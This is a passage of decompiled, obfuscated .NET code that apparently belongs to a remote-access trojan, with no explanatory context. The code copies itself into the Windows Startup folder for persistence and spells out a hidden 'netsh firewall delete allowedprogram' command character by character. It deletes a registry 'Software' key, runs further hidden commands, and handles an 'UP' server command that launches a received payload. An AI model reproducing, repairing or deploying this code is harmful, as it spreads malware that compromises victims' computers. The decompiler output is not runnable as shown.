                    object obj12 = obj10(obj11, (object) chArray2);
                    objArray6[1] = obj12;
                    objArray4 = objArray3;
                    object[] Arguments = objArray4;
                    flagArray2 = new bool[2]{ true, false };
                    bool[] CopyBack = flagArray2;
                    NewLateBinding.LateCall(Instance, (System.Type) null, MemberName, Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
                    if (flagArray2[0])
                    {
                      // ISSUE: type reference
                      obj0.\u0006 = (string) \u0014.\u001D(\u0012.\u001B(objArray4[0]), \u0013.\u001C(__typeref (string)));
                    }
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    exception11 = ex;
                    global::\u0006.\u0006();
                  }
                  try
                  {
                    \u0001 obj13 = \u0001.\u0001;
                    object obj14 = \u0001.\u0001(\u0001.\u0001(obj0.\u0004, (System.Type) null, \u0006.\u0007.\u001F(795), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(873), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
                    string str8 = \u0006.\u0007.\u001F(839);
                    objArray4 = new object[2]
                    {
                      (object) obj0.\u0010,
                      (object) true
                    };
                    objArray3 = objArray4;
                    object[] objArray7 = objArray3;
                    flagArray2 = new bool[2]{ true, false };
                    bool[] flagArray4 = flagArray2;
                    object Instance = obj13(obj14, (System.Type) null, str8, objArray7, (string[]) null, (System.Type[]) null, flagArray4);
                    if (flagArray2[0])
                    {
                      // ISSUE: type reference
                      obj0.\u0010 = (string) \u0014.\u001D(\u0012.\u001B(objArray3[0]), \u0013.\u001C(__typeref (string)));
                    }
                    string MemberName = \u0006.\u0007.\u001F(2460);
                    objArray2 = new object[2]
                    {
                      (object) obj0.\u0006,
                      null
                    };
                    object[] objArray8 = objArray2;
                    global::\u000E obj15 = global::\u000E.\u0015;
                    object obj16 = global::\u000E.\u0015(global::\u000E.\u0015((object) '"', \u0001.\u0001(obj0.\u0001, (System.Type) null, \u0006.\u0007.\u001F(2504), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)), (object) '"');
                    chArray1 = new char[3]{ ' ', '.', '.' };
                    char[] chArray3 = chArray1;
                    object obj17 = obj15(obj16, (object) chArray3);
                    objArray8[1] = obj17;
                    objArray1 = objArray2;
                    object[] Arguments = objArray1;
                    flagArray1 = new bool[2]{ true, false };
                    bool[] CopyBack = flagArray1;
                    NewLateBinding.LateCall(Instance, (System.Type) null, MemberName, Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
                    if (flagArray1[0])
                    {
                      // ISSUE: type reference
                      obj0.\u0006 = (string) \u0014.\u001D(\u0012.\u001B(objArray1[0]), \u0013.\u001C(__typeref (string)));
                    }
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    exception12 = ex;
                    global::\u0006.\u0006();
                  }
                  try
                  {
                    \u008C.\u0003\u0003(global::\u0002.\u0002(\u0001.\u0001(obj0.\u0001, (System.Type) null, \u0006.\u0007.\u001F(2504), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)), \u009F\u0002.\u0083\u0005(\u0019\u0002.\u008C\u0004(Environment.SpecialFolder.Startup), \u0006.\u0007.\u001F(834), obj0.\u0006, \u0006.\u0007.\u001F(2517)), true);
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    exception13 = ex;
                    global::\u0006.\u0006();
                  }
                }
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                exception14 = ex;
                global::\u0006.\u0006();
              }
            }
          default:
            if (\u0018.\u007E\u0084((object) \u008B.\u0002\u0003()) > 0)
            {
              \u0018\u0002 obj18 = \u0018\u0002.\u008B\u0004;
              string str9 = \u008B.\u0002\u0003();
              chArray1 = new char[1]{ ':' };
              string str10 = new string(chArray1);
              strArray = obj18(str9, str10, -1, CompareMethod.Binary);
              str1 = strArray[0];
              \u001C obj19 = \u001C.\u0098;
              string str11 = str1;
              chArray1 = new char[2]{ 'U', 'P' };
              string str12 = new string(chArray1);
              if (obj19(str11, str12, false) == 0)
              {
                try
                {
                  \u0011 obj20 = \u0011.\u001A;
                  object obj21 = \u0001.\u0001(\u0001.\u0001(obj0.\u0004, (System.Type) null, \u0006.\u0007.\u001F(795), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(856), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
                  string str13 = \u0006.\u0007.\u001F(2460);
                  objArray1 = new object[2]
                  {
                    (object) \u0006.\u0007.\u001F(2473),
                    (object) \u0006.\u0007.\u001F(736)
                  };
                  object[] objArray9 = objArray1;
                  object obj22 = obj20(obj21, (System.Type) null, str13, objArray9, (string[]) null, (System.Type[]) null, (bool[]) null, true);
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  exception1 = ex;
                  global::\u0006.\u0006();
                }
                try
                {
                  obj1 = (object) \u0099\u0002.\u001E\u0005(\u0096.\u001A\u0003(strArray[1]));
                  \u0011 obj23 = \u0011.\u001A;
                  object obj24 = obj1;
                  string str14 = \u0006.\u0007.\u001F(2478);
                  objArray1 = new object[1]{ (object) 5000 };
                  object[] objArray10 = objArray1;
                  object obj25 = obj23(obj24, (System.Type) null, str14, objArray10, (string[]) null, (System.Type[]) null, (bool[]) null, true);
                  try
                  {
                    object obj26 = \u0011.\u001A(obj1, (System.Type) null, \u0006.\u0007.\u001F(586), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
                    goto case null;
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    exception2 = ex;
                    global::\u0006.\u0006();
                    goto case null;
                  }
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  exception3 = ex;
                  \u001A.\u0095(5000);
                  global::\u0006.\u0006();
                  goto case null;
                }
              }
              else
              {
                \u001C obj27 = \u001C.\u0098;
                string str15 = str1;
                chArray1 = new char[2]{ '.', '.' };
                string str16 = new string(chArray1);
                if (obj27(str15, str16, false) == 0)
                {
                  \u001A.\u0095(5000);
                  goto case null;
                }
                else
                  goto case null;
              }
            }
            else
              goto case null;
        }
      }
      catch (Exception ex)
      {
        \u0001 obj28;
        object[] objArray11 = new object[33]
        {
          (object) *(int*) voidPtr,
          (object) str2,
          (object) *(int*) ((IntPtr) voidPtr + 4),
          obj2,
          (object) strArray,
          (object) exception1,
          obj1,
          (object) exception2,
          (object) exception3,
          (object) process,
          (object) exception4,
          (object) exception5,
          (object) exception6,
          (object) exception7,
          (object) exception8,
          (object) exception9,
          (object) exception10,
          (object) exception11,
          (object) exception12,
          (object) exception13,
          (object) exception14,
          (object) chArray1,
          (object) str1,
          (object) objArray1,
          (object) *(int*) ((IntPtr) voidPtr + 8),
          (object) processArray,
          (object) obj28,
          (object) objArray2,
          (object) flagArray1,
          (object) objArray3,
          (object) objArray4,
          (object) flagArray2,
          (object) obj0
        };
        \u0006.\u0007.\u0001(ex, objArray11);
        throw;
      }
label_57:
      voidPtr = (void*) num;
      goto label_1;
    }

    static unsafe bool \u0001([In] Assembly obj0, [In] Assembly obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(5);
      byte[] numArray1;
      byte[] publicKey1;
      try
      {
        do
        {
          publicKey1 = obj1.GetName().GetPublicKey();
          byte[] publicKey2 = obj0.GetName().GetPublicKey();
          if (true)
            goto label_18;
label_3:
          int num1 = numArray1 == null ? 1 : 0;
          while (true)
          {
            int num2 = publicKey1 == null ? 1 : 0;
            if (num1 == num2)
            {
              if (numArray1 != null)
              {
                if (true)
                  *(int*) voidPtr = 0;
                int num3;
                while (true)
                {
                  num3 = *(int*) voidPtr;
                  if (true)
                  {
                    int num4 = numArray1.Length;
                    if (true)
                      num4 = num4;
                    if (num3 < num4)
                    {
                      if ((int) numArray1[*(int*) voidPtr] == (int) publicKey1[*(int*) voidPtr])
                        *(int*) voidPtr = *(int*) voidPtr + 1;
                      else
                        goto label_11;
                    }
                    else
                      goto label_17;
                  }
                  else
                    break;
                }
                num1 = num3;
              }
              else
                goto label_17;
            }
            else
              break;
          }
          continue;
label_18:
          numArray1 = publicKey2;
          goto label_3;
        }
        while (false);
        *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 0;
        goto label_20;
label_11:
        *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 0;
        goto label_20;
label_17:
        *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 1;
      }
      catch (Exception ex)
      {
        byte[] numArray2 = publicKey1;
        byte[] numArray3 = numArray1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) *(int*) voidPtr;
        Assembly assembly1 = obj1;
        Assembly assembly2 = obj0;
        \u0006.\u0007.\u0001(ex, (object) numArray2, (object) numArray3, (object) local, (object) assembly1, (object) assembly2);
        throw;
      }
label_20:
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 4);
    }

    static ICryptoTransform \u0001(
      [In] bool obj0,
      [In] byte[] obj1,
      [In] \u0006.\u0004 obj2,
      [In] byte[] obj3)
    {
      object[] objArray1;
      MethodInfo method;
      try
      {
        MethodInfo setMethod1 = obj2.\u0001.GetProperty("Key").GetSetMethod();
        object obj4 = obj2.\u0001;
        objArray1 = new object[1]{ (object) obj1 };
        object[] parameters1 = objArray1;
        setMethod1.Invoke(obj4, parameters1);
        MethodInfo setMethod2 = obj2.\u0001.GetProperty("IV").GetSetMethod();
        object obj5 = obj2.\u0001;
        objArray1 = new object[1]{ (object) obj3 };
        object[] parameters2 = objArray1;
        setMethod2.Invoke(obj5, parameters2);
        method = obj2.\u0001.GetMethod(obj0 ? "CreateDecryptor" : "CreateEncryptor", new System.Type[0]);
        return (ICryptoTransform) method.Invoke(obj2.\u0001, new object[0]);
      }
      catch (Exception ex)
      {
        MethodInfo methodInfo = method;
        object[] objArray2 = objArray1;
        \u0006.\u0004 obj = obj2;
        byte[] numArray1 = obj1;
        byte[] numArray2 = obj3;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local = (ValueType) obj0;
        \u0006.\u0007.\u0001(ex, (object) methodInfo, (object) objArray2, (object) obj, (object) numArray1, (object) numArray2, (object) local);
        throw;
      }
    }

    static void \u0001([In] Exception obj0, [In] object obj1, [In] object obj2, [In] object obj3)
    {
      do
      {
        if (true)
          goto label_3;
label_2:
        continue;
label_3:
        \u0006.\u0007.\u0001(obj0, new object[3]
        {
          obj1,
          obj2,
          obj3
        });
        goto label_2;
      }
      while (false);
    }

    static unsafe int \u0001([In] \u0003.\u0004.\u0007.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      IntPtr num = __untypedstackalloc(12);
      if (true)
        goto label_7;
label_1:
      void* voidPtr;
      try
      {
        *(int*) voidPtr = 0;
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        while (*(int*) ((IntPtr) voidPtr + 4) < obj0.\u0001.Length)
        {
          *(int*) voidPtr = *(int*) voidPtr + (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 4)] * (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 4)];
          *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 1;
        }
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) voidPtr;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        \u0003.\u0004.\u0007.\u0001 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) local1, (object) local2, (object) obj);
        throw;
      }
      return *(int*) ((IntPtr) voidPtr + 8);
label_7:
      voidPtr = (void*) num;
      goto label_1;
    }

    static unsafe string \u0001([In] int obj0, [In] \u0001 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr1 = (void*) __untypedstackalloc(8);
      char[] chArray1;
      string str1;
      string str2;
      Random random1;
      try
      {
        global::\u0006.\u0008();
        random1 = new Random();
        str2 = \u0006.\u0007.\u001F(379);
        chArray1 = new char[26]
        {
          'a',
          'b',
          'c',
          'd',
          'e',
          'f',
          'g',
          'h',
          'i',
          'j',
          'k',
          'l',
          'm',
          'n',
          'o',
          'p',
          'q',
          'r',
          's',
          't',
          'u',
          'v',
          'w',
          'x',
          'y',
          'z'
        };
        str1 = new string(chArray1);
        void* voidPtr2 = voidPtr1;
        *(int*) ((IntPtr) voidPtr1 + 4) = obj0;
        *(int*) voidPtr2 = 1;
        while (*(int*) voidPtr1 <= *(int*) ((IntPtr) voidPtr1 + 4))
        {
          str2 = \u001D.\u0099(str2, \u0002\u0003.\u0086\u0005(\u0002\u0002.\u007E\u009D\u0003((object) str1, \u0001\u0003.\u007E\u0084\u0005((object) random1, 0, \u0018.\u007E\u0084((object) str1)))));
          *(int*) voidPtr1 = checked (*(int*) voidPtr1 + 1);
        }
        return str2;
      }
      catch (Exception ex)
      {
        string str3 = str1;
        Random random2 = random1;
        string str4;
        string str5 = str4;
        string str6 = str2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr1;
        char[] chArray2 = chArray1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr1 + 4);
        \u0001 obj = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) obj0;
        \u0006.\u0007.\u0001(ex, (object) str3, (object) random2, (object) str5, (object) str6, (object) local1, (object) chArray2, (object) local2, (object) obj, (object) local3);
        throw;
      }
    }

    static int \u0001()
    {
      Version version = new Version(\u0006.\u0007.\u001F(2526));
      return \u0018.\u007E\u008A((object) version);
    }

    [DllImport("user32.dll", EntryPoint = "GetWindowThreadProcessId", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern int \u0001([In] IntPtr obj0, [In] ref int obj1);

    static unsafe string \u0001([In] \u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      IntPtr num1;
      char[] chArray1;
      string str1;
      string str2;
      string str3;
      Exception exception1;
      Exception exception2;
      try
      {
        try
        {
          num1 = \u0006.\u0007.\u0001();
          while (\u0003\u0003.\u0087\u0005(num1, IntPtr.Zero))
          {
            if (true)
            {
              \u0001 obj = obj0;
              chArray1 = new char[1]{ ' ' };
              str1 = new string(chArray1);
              ref string local = ref str1;
              str2 = \u0006.\u0007.\u0001(obj, ref local);
              goto label_12;
            }
          }
          if (true)
          {
            *(int*) ((IntPtr) voidPtr + 4) = \u0006.\u0007.\u0001(\u009E\u0002.\u0082\u0005(num1));
            \u0004\u0003 obj1 = \u0004\u0003.\u0088\u0005;
            int num2 = checked (*(int*) unchecked ((IntPtr) voidPtr + 4) + 1);
            chArray1 = new char[1]{ '*' };
            string str4 = new string(chArray1);
            str3 = obj1(num2, str4);
            \u0006.\u0007.\u0001(num1, ref str3, checked (*(int*) unchecked ((IntPtr) voidPtr + 4) + 1));
            \u0006.\u0007.\u0001(num1, ref *(int*) voidPtr);
            if (*(int*) voidPtr == 0)
            {
              str2 = \u0006.\u0007.\u0001(obj0, ref str3);
            }
            else
            {
              try
              {
                \u0001 obj2 = obj0;
                str1 = \u001E.\u007E\u0008\u0002((object) \u0099\u0002.\u001E\u0005(*(int*) voidPtr));
                ref string local = ref str1;
                str2 = \u0006.\u0007.\u0001(obj2, ref local);
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                exception1 = ex;
                str2 = \u0006.\u0007.\u0001(obj0, ref str3);
                global::\u0006.\u0006();
              }
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception2 = ex;
          \u0001 obj = obj0;
          chArray1 = new char[1]{ ' ' };
          str1 = new string(chArray1);
          ref string local = ref str1;
          str2 = \u0006.\u0007.\u0001(obj, ref local);
          do
          {
            global::\u0006.\u0006();
          }
          while (false);
        }
label_12:
        return str2;
      }
      catch (Exception ex)
      {
        string str5 = str2;
        // ISSUE: variable of a boxed type
        __Boxed<IntPtr> local1 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        string str6 = str3;
        Exception exception3 = exception1;
        Exception exception4 = exception2;
        char[] chArray2 = chArray1;
        string str7 = str1;
        \u0001 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) str5, (object) local1, (object) local2, (object) local3, (object) str6, (object) exception3, (object) exception4, (object) chArray2, (object) str7, (object) obj);
        throw;
      }
    }

    static bool \u0001()
    {
      bool flag;
      try
      {
        \u0007.\u0003.\u0003 obj;
        do
        {
          obj = new \u0007.\u0003.\u0003();
        }
        while (false);
        \u0006.\u0007.\u0001(ref obj);
        int num1 = (int) obj.\u0001;
        int num2;
        while (true)
        {
          num2 = num1 == 9 ? 1 : 0;
          if (false)
            num1 = num2;
          else if (false)
            num1 = num2;
          else
            break;
        }
        flag = num2 != 0;
      }
      catch
      {
        flag = false;
      }
      return flag;
    }

    static bool \u0001([In] \u0003.\u0004.\u0008 obj0)
    {
      bool flag;
      try
      {
        flag = obj0.\u000E == obj0.\u0008;
      }
      catch (Exception ex)
      {
        \u0003.\u0004.\u0008 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) obj);
        throw;
      }
      return flag;
    }

    static void \u0001([In] \u0001 obj0)
    {
      object[] objArray1;
      object[] objArray2;
      bool[] flagArray1;
      object[] objArray3;
      object[] objArray4;
      bool[] flagArray2;
      Exception exception1;
      Exception exception2;
      char[] chArray1;
      Exception exception3;
      string str1;
      Exception exception4;
      Exception exception5;
      Exception exception6;
      int num1;
      try
      {
        \u0006.\u0007.\u0001(obj0, 0);
        \u0006.\u0007.\u0001(obj0.\u0001);
        num1 = 0;
        try
        {
          \u0001 obj1 = \u0001.\u0001;
          object obj2 = \u0001.\u0001(\u0001.\u0001(obj0.\u0004, (System.Type) null, \u0006.\u0007.\u001F(795), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(856), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
          string str2 = \u0006.\u0007.\u001F(839);
          objArray1 = new object[2]
          {
            (object) obj0.\u0010,
            (object) true
          };
          objArray2 = objArray1;
          object[] objArray5 = objArray2;
          flagArray1 = new bool[2]{ true, false };
          bool[] flagArray3 = flagArray1;
          object Instance = obj1(obj2, (System.Type) null, str2, objArray5, (string[]) null, (System.Type[]) null, flagArray3);
          if (flagArray1[0])
          {
            // ISSUE: type reference
            obj0.\u0010 = (string) \u0014.\u001D(\u0012.\u001B(objArray2[0]), \u0013.\u001C(__typeref (string)));
          }
          string MemberName = \u0006.\u0007.\u001F(2539);
          objArray3 = new object[2]
          {
            (object) obj0.\u0006,
            (object) false
          };
          objArray4 = objArray3;
          object[] Arguments = objArray4;
          flagArray2 = new bool[2]{ true, false };
          bool[] CopyBack = flagArray2;
          NewLateBinding.LateCall(Instance, (System.Type) null, MemberName, Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
          if (flagArray2[0])
          {
            // ISSUE: type reference
            obj0.\u0006 = (string) \u0014.\u001D(\u0012.\u001B(objArray4[0]), \u0013.\u001C(__typeref (string)));
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception1 = ex;
          global::\u0006.\u0006();
        }
        try
        {
          \u0001 obj3 = \u0001.\u0001;
          object obj4 = \u0001.\u0001(\u0001.\u0001(obj0.\u0004, (System.Type) null, \u0006.\u0007.\u001F(795), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(873), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
          string str3 = \u0006.\u0007.\u001F(839);
          objArray4 = new object[2]
          {
            (object) obj0.\u0010,
            (object) true
          };
          objArray3 = objArray4;
          object[] objArray6 = objArray3;
          flagArray2 = new bool[2]{ true, false };
          bool[] flagArray4 = flagArray2;
          object Instance = obj3(obj4, (System.Type) null, str3, objArray6, (string[]) null, (System.Type[]) null, flagArray4);
          if (flagArray2[0])
          {
            // ISSUE: type reference
            obj0.\u0010 = (string) \u0014.\u001D(\u0012.\u001B(objArray3[0]), \u0013.\u001C(__typeref (string)));
          }
          string MemberName = \u0006.\u0007.\u001F(2539);
          objArray2 = new object[2]
          {
            (object) obj0.\u0006,
            (object) false
          };
          objArray1 = objArray2;
          object[] Arguments = objArray1;
          flagArray1 = new bool[2]{ true, false };
          bool[] CopyBack = flagArray1;
          NewLateBinding.LateCall(Instance, (System.Type) null, MemberName, Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
          if (flagArray1[0])
          {
            // ISSUE: type reference
            obj0.\u0006 = (string) \u0014.\u001D(\u0012.\u001B(objArray1[0]), \u0013.\u001C(__typeref (string)));
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception2 = ex;
          global::\u0006.\u0006();
        }
        try
        {
          chArray1 = new char[37]
          {
            'n',
            'e',
            't',
            's',
            'h',
            ' ',
            'f',
            'i',
            'r',
            'e',
            'w',
            'a',
            'l',
            'l',
            ' ',
            'd',
            'e',
            'l',
            'e',
            't',
            'e',
            ' ',
            'a',
            'l',
            'l',
            'o',
            'w',
            'e',
            'd',
            'p',
            'r',
            'o',
            'g',
            'r',
            'a',
            'm',
            ' '
          };
          int num2 = \u0005\u0003.\u0089\u0005(global::\u0002.\u0002(global::\u000E.\u0015(global::\u000E.\u0015((object) \u001D.\u0099(new string(chArray1), \u0006.\u0007.\u001F(1127)), \u0001.\u0001(obj0.\u0001, (System.Type) null, \u0006.\u0007.\u001F(2504), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)), (object) '"')), AppWinStyle.Hide, false, -1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception3 = ex;
          global::\u0006.\u0006();
        }
        try
        {
          str1 = \u009F\u0002.\u0083\u0005(\u0019\u0002.\u008C\u0004(Environment.SpecialFolder.Startup), \u0006.\u0007.\u001F(834), obj0.\u0006, \u0006.\u0007.\u001F(2517));
          \u008D\u0002.\u0007\u0005(str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception4 = ex;
          global::\u0006.\u0006();
        }
        try
        {
          \u0011 obj5 = \u0011.\u001A;
          \u0001 obj6 = \u0001.\u0001;
          object obj7 = \u0001.\u0001(\u0001.\u0001(obj0.\u0004, (System.Type) null, \u0006.\u0007.\u001F(795), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(856), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
          string str4 = \u0006.\u0007.\u001F(839);
          objArray4 = new object[2];
          object[] objArray7 = objArray4;
          chArray1 = new char[8]
          {
            'S',
            'o',
            'f',
            't',
            'w',
            'a',
            'r',
            'e'
          };
          char[] chArray2 = chArray1;
          objArray7[0] = (object) chArray2;
          objArray4[1] = (object) true;
          object[] objArray8 = objArray4;
          object obj8 = obj6(obj7, (System.Type) null, str4, objArray8, (string[]) null, (System.Type[]) null, (bool[]) null);
          string str5 = \u0006.\u0007.\u001F(2556);
          objArray3 = new object[2]
          {
            (object) obj0.\u0006,
            (object) false
          };
          objArray2 = objArray3;
          object[] objArray9 = objArray2;
          flagArray2 = new bool[2]{ true, false };
          bool[] flagArray5 = flagArray2;
          object obj9 = obj5(obj8, (System.Type) null, str5, objArray9, (string[]) null, (System.Type[]) null, flagArray5, true);
          if (true)
          {
            if (flagArray2[0])
            {
              // ISSUE: type reference
              obj0.\u0006 = (string) \u0014.\u001D(\u0012.\u001B(objArray2[0]), \u0013.\u001C(__typeref (string)));
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception5 = ex;
          global::\u0006.\u0006();
        }
        try
        {
          int num3 = \u0005\u0003.\u0089\u0005(global::\u0002.\u0002(global::\u000E.\u0015(global::\u000E.\u0015(global::\u000E.\u0015((object) \u0006.\u0007.\u001F(2573), \u0001.\u0001(obj0.\u0001, (System.Type) null, \u0006.\u0007.\u001F(2504), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)), (object) '"'), (object) \u0006.\u0007.\u001F(2610))), AppWinStyle.Hide, false, -1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception6 = ex;
          global::\u0006.\u0006();
        }
        global::\u0006.\u0007();
      }
      catch (Exception ex)
      {
        object[] objArray10 = new object[16]
        {
          (object) num1,
          (object) exception1,
          (object) exception2,
          (object) exception3,
          (object) str1,
          (object) exception4,
          (object) exception5,
          (object) exception6,
          (object) objArray1,
          (object) objArray2,
          (object) flagArray1,
          (object) objArray3,
          (object) objArray4,
          (object) flagArray2,
          (object) chArray1,
          (object) obj0
        };
        \u0006.\u0007.\u0001(ex, objArray10);
        throw;
      }
    }

    static Icon \u0001()
    {
      Icon icon;
      try
      {
        if (true)
          icon = \u0006.\u0007.\u0001();
      }
      catch (Exception ex)
      {
        if (true)
          icon = \u0006.\u0007.\u0001(\u0006.\u0007.\u001F(2623));
      }
      return icon;
    }

    static short \u0001([In] int obj0)
    {
      short num1;
      try
      {
        int num2 = (int) \u0003.\u0004.\u0007.\u0001[obj0 & 15];
        if (true)
          num2 <<= 12;
        int num3;
        if (true)
        {
          int num4 = (int) \u0003.\u0004.\u0007.\u0001[obj0 >> 4 & 15];
          int num5;
          while (true)
          {
            num5 = num4 << 8;
            if (false)
              num4 = num5;
            else
              break;
          }
          num3 = num2 | num5;
        }
        else
          goto label_7;
label_6:
        int num6 = (int) \u0003.\u0004.\u0007.\u0001[obj0 >> 8 & 15] << 4;
        num2 = num3 | num6 | (int) \u0003.\u0004.\u0007.\u0001[obj0 >> 12];
label_7:
        num3 = (int) (short) num2;
        if (true)
          num1 = (short) num3;
        else
          goto label_6;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) obj0;
        \u0006.\u0007.\u0001(ex, (object) local);
        throw;
      }
      return num1;
    }

    static unsafe bool \u0001([In] int obj0, [In] \u0003.\u0004.\u0008 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(23);
      int num1;
      int index;
      int num2;
      short[] numArray;
      try
      {
        num1 = 128;
        *(int*) voidPtr = 128;
        numArray = obj1.\u0002;
        index = obj1.\u0005;
        *(int*) ((IntPtr) voidPtr + 4) = obj1.\u0005 + obj1.\u0003;
        *(int*) ((IntPtr) voidPtr + 8) = Math.Max(obj1.\u0003, 2);
        *(int*) ((IntPtr) voidPtr + 12) = Math.Max(obj1.\u0005 - 32506, 0);
        *(int*) ((IntPtr) voidPtr + 16) = obj1.\u0005 + 258 - 1;
        *(sbyte*) ((IntPtr) voidPtr + 20) = (sbyte) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 4) - 1];
        *(sbyte*) ((IntPtr) voidPtr + 21) = (sbyte) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 4)];
        if (*(int*) ((IntPtr) voidPtr + 8) >= 8)
          num1 >>= 2;
        if (*(int*) voidPtr > obj1.\u0006)
          *(int*) voidPtr = obj1.\u0006;
        do
        {
          if ((int) obj1.\u0001[obj0 + *(int*) ((IntPtr) voidPtr + 8)] == (int) *(byte*) ((IntPtr) voidPtr + 21) && (int) obj1.\u0001[obj0 + *(int*) ((IntPtr) voidPtr + 8) - 1] == (int) *(byte*) ((IntPtr) voidPtr + 20) && (int) obj1.\u0001[obj0] == (int) obj1.\u0001[index])
          {
            while ((int) obj1.\u0001[obj0 + 1] == (int) obj1.\u0001[index + 1])
            {
              num2 = obj0 + 2;
              index += 2;
              do
                ;
              while ((int) obj1.\u0001[++index] == (int) obj1.\u0001[++num2] && (int) obj1.\u0001[++index] == (int) obj1.\u0001[++num2] && (int) obj1.\u0001[++index] == (int) obj1.\u0001[++num2] && (int) obj1.\u0001[++index] == (int) obj1.\u0001[++num2] && (int) obj1.\u0001[++index] == (int) obj1.\u0001[++num2] && (int) obj1.\u0001[++index] == (int) obj1.\u0001[++num2] && (int) obj1.\u0001[++index] == (int) obj1.\u0001[++num2] && (int) obj1.\u0001[++index] == (int) obj1.\u0001[++num2] && index < *(int*) ((IntPtr) voidPtr + 16));
              if (index > *(int*) ((IntPtr) voidPtr + 4))
              {
                if (true)
                {
                  obj1.\u0002 = obj0;
                  *(int*) ((IntPtr) voidPtr + 4) = index;
                  *(int*) ((IntPtr) voidPtr + 8) = index - obj1.\u0005;
                  if (*(int*) ((IntPtr) voidPtr + 8) < *(int*) voidPtr)
                  {
                    *(sbyte*) ((IntPtr) voidPtr + 20) = (sbyte) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 4) - 1];
                    *(sbyte*) ((IntPtr) voidPtr + 21) = (sbyte) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 4)];
                  }
                  else
                    goto label_15;
                }
                else
                  continue;
              }
              index = obj1.\u0005;
              break;
            }
          }
        }
        while ((obj0 = (int) numArray[obj0 & (int) short.MaxValue] & (int) ushort.MaxValue) > *(int*) ((IntPtr) voidPtr + 12) && --num1 != 0);
label_15:
        obj1.\u0003 = Math.Min(*(int*) ((IntPtr) voidPtr + 8), obj1.\u0006);
        *(sbyte*) ((IntPtr) voidPtr + 22) = (sbyte) (obj1.\u0003 >= 3);
      }
      catch (Exception ex)
      {
        object[] objArray = new object[13]
        {
          (object) num1,
          (object) *(int*) voidPtr,
          (object) numArray,
          (object) index,
          (object) num2,
          (object) *(int*) ((IntPtr) voidPtr + 4),
